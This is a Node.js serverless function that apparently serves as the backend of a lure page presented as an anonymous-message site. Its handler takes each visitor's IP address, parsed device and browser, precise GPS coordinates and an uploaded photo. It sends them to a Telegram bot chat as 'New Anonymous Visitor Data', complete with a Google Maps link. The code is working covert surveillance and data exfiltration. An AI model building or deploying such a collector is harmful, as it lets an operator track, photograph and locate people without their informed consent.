const multipart = require('lambda-multipart-parser');
const fetch = require('node-fetch');
const FormData = require('form-data');

// --- NEW/UPDATED Helper Function for Cleaner User-Agent Parsing (Duplicate for consistency) ---
function parseUserAgent(userAgentString) {
    let os = 'Unknown OS';
    let device = 'Unknown Device';
    let browser = 'Unknown Browser';
    let app = ''; // To store detected app name

    if (!userAgentString) return { device: 'Unknown Device', browser: 'Unknown Browser' };

    // --- Detect OS & Base Device ---
    if (userAgentString.includes('Android')) {
        const androidVersionMatch = userAgentString.match(/Android (\d+(?:\.\d+)*)/);
        os = `Android ${androidVersionMatch ? androidVersionMatch[1] : ''}`;
        // Try to get a specific device model (like V2040)
        const modelMatch = userAgentString.match(/Android[^;)]+;\s*([^;)]+)\s*Build/) ||
                           userAgentString.match(/\(([^;)]+); Android[^)]*\)/);
        if (modelMatch && modelMatch[1]) {
            device = modelMatch[1].trim().replace(/^Linux;\s*/, '').replace(/Build\/.*/, '').trim();
        }
        // Check for specific manufacturer/model at the very end
        const specificDeviceEndMatch = userAgentString.match(/Android \(.*\s*(vivo|samsung|xiaomi|huawei|lg|google|motorola|oneplus);\s*([^;)]+)\s*\)/i);
        if (specificDeviceEndMatch && specificDeviceEndMatch[1] && specificDeviceEndMatch[2]) {
             device = `${specificDeviceEndMatch[1]} ${specificDeviceEndMatch[2]}`;
        }

    } else if (userAgentString.includes('iPhone')) {
        const iOSVersionMatch = userAgentString.match(/iPhone OS (\d+_\d+(?:_\d+)*)/);
        os = `iOS ${iOSVersionMatch ? iOSVersionMatch[1].replace(/_/g, '.') : ''}`;
        device = 'iPhone';
    } else if (userAgentString.includes('Windows')) {
        os = 'Windows';
        device = 'PC';
    } else if (userAgentString.includes('Macintosh')) {
        os = 'macOS';
        device = 'Mac';
    } else if (userAgentString.includes('Linux')) { // Generic Linux
        os = 'Linux';
        device = 'PC';
    }


    // --- Detect Browser (Prioritize common ones) ---
    // CriOS is Chrome on iOS
    if (userAgentString.includes('CriOS/')) { 
        const chromeiOSVersionMatch = userAgentString.match(/CriOS\/(\d+\.\d+)/);
        browser = `Chrome (iOS) ${chromeiOSVersionMatch ? chromeiOSVersionMatch[1] : ''}`;
    } else if (userAgentString.includes('Chrome/') && !userAgentString.includes('Edg/')) { // Standard Chrome
        const chromeVersionMatch = userAgentString.match(/Chrome\/(\d+\.\d+)/);
        browser = `Chrome ${chromeVersionMatch ? chromeVersionMatch[1] : ''}`;
    } else if (userAgentString.includes('Firefox/')) {
        const firefoxVersionMatch = userAgentString.match(/Firefox\/(\d+\.\d+)/);
        browser = `Firefox ${firefoxVersionMatch ? firefoxVersionMatch[1] : ''}`;
    } else if (userAgentString.includes('Safari/') && !userAgentString.includes('Chrome/') && !userAgentString.includes('CriOS/')) { // Pure Safari (not embedded)
        const safariVersionMatch = userAgentString.match(/Version\/(\d+\.\d+)/);
        browser = `Safari ${safariVersionMatch ? safariVersionMatch[1] : ''}`;
    } else if (userAgentString.includes('Edg/')) { // Microsoft Edge (Chromium)
        const edgeVersionMatch = userAgentString.match(/Edg\/(\d+\.\d+)/);
        browser = `Edge ${edgeVersionMatch ? edgeVersionMatch[1] : ''}`;
    } else if (userAgentString.includes('Opera/') || userAgentString.includes('OPR/')) { // Opera
        const operaVersionMatch = userAgentString.match(/(?:Opera|OPR)\/(\d+\.\d+)/);
        browser = `Opera ${operaVersionMatch ? operaVersionMatch[1] : ''}`;
    } else if (userAgentString.includes('MSIE') || userAgentString.includes('Trident/')) { // Internet Explorer
        browser = 'Internet Explorer';
    }

    // --- Detect Specific Apps (Overrides generic browser if app is the primary context) ---
    // If Instagram App is detected, prioritize it as the "browser"
    if (userAgentString.includes('Instagram')) {
        const instagramVersionMatch = userAgentString.match(/Instagram (\d+\.\d+\.\d+)/);
        app = `Instagram App ${instagramVersionMatch ? instagramVersionMatch[1] : ''}`;
        browser = app; // Overwrite browser with app name
    } else if (userAgentString.includes('Facebook')) { // Facebook App
        app = 'Facebook App';
        browser = app; // Overwrite browser with app name
    } else if (userAgentString.includes('wv)')) { // WebView (often embedded in various apps, if no specific app detected)
        app = 'WebView';
        if (browser === 'Unknown Browser') browser = app; // Only set if no more specific browser detected
    }
    
    // Final simplified output for Device (OS + Model)
    const finalDeviceOutput = device !== 'Unknown Device' ? `${os} (${device})` : os;
    const finalBrowserOutput = browser; // Browser now holds the app name if detected

    return {
        device: finalDeviceOutput.trim(),
        browser: finalBrowserOutput.trim()
    };
}


exports.handler = async (event) => {
    if (event.httpMethod !== 'POST') {
        return { statusCode: 405, body: 'Method Not Allowed' };
    }

    try {
        const result = await multipart.parse(event);
        const latitude = result.latitude ? parseFloat(result.latitude) : null;
        const longitude = result.longitude ? parseFloat(result.longitude) : null;
        const initialPhotoFile = result.files.find(f => f.fieldname === 'photo');

        const ip = event.headers['x-nf-client-connection-ip'] || 'N/A';
        const userAgentString = event.headers['user-agent'] || 'N/A';
        const { device, browser } = parseUserAgent(userAgentString); // Use the new parser
        const network = 'unknown'; 
        
        const now = new Date();
        const timeOptions = { 
            timeZone: 'Asia/Kolkata', 
            month: 'numeric', day: 'numeric', year: 'numeric', 
            hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true 
        };
        const formattedTime = now.toLocaleString('en-US', timeOptions);

        console.log('DEBUG: Parsed incoming data in collect-initial-data:', { latitude, longitude, photo: initialPhotoFile ? initialPhotoFile.filename : 'N/A', device, browser });

        const botToken = process.env.TELEGRAM_BOT_1_TOKEN; 
        const chatId = process.env.TELEGRAM_BOT_1_CHAT_ID;

        if (!botToken || !chatId) {
            console.error('Missing TELEGRAM_BOT_1_TOKEN or TELEGRAM_BOT_1_CHAT_ID environment variables for initial data.');
            return { statusCode: 500, body: 'Server configuration error.' };
        }

        let textNotification = `⚡️ *New Anonymous Visitor Data* ⚡️\n\n`;
        textNotification += `*Timestamp:* ${formattedTime}\n`;
        textNotification += `*IP Address:* \`${ip}\`\n`;
        textNotification += `*Device:* ${device}\n`; // Use parsed device
        textNotification += `*Browser:* ${browser}\n`; // Use parsed browser
        textNotification += `*Network:* \`${network}\`\n`;

        if (latitude !== null && longitude !== null) {
            const googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
            textNotification += `*Precise Location:* [View Map](${googleMapsLink})\n`;
        } else {
            textNotification += `*Precise Location:* Not shared (or permission denied)\n`;
        }

        if (initialPhotoFile) {
            textNotification += `*Initial Photo:* Yes (attached below)\n`;
        } else {
            textNotification += `*Initial Photo:* No (or permission denied)\n`;
        }
        textNotification += `*User Interaction:* Visited page, no anonymous message yet.\n`;


        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chatId, text: textNotification, parse_mode: 'Markdown' }),
        });

        if (initialPhotoFile) {
            const form = new FormData();
            form.append('chat_id', chatId);
            form.append('photo', initialPhotoFile.content, { filename: initialPhotoFile.filename });

            await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                method: 'POST',
                body: form
            });
            console.log(`Initial photo sent: ${initialPhotoFile.filename}`);
        }

        return { statusCode: 200, body: JSON.stringify({ success: true }) };

    } catch (error) {
        console.error("Error in collect-initial-data function:", error);
        return { statusCode: 500, body: JSON.stringify({ error: 'Internal Server Error' }) };
    }
};
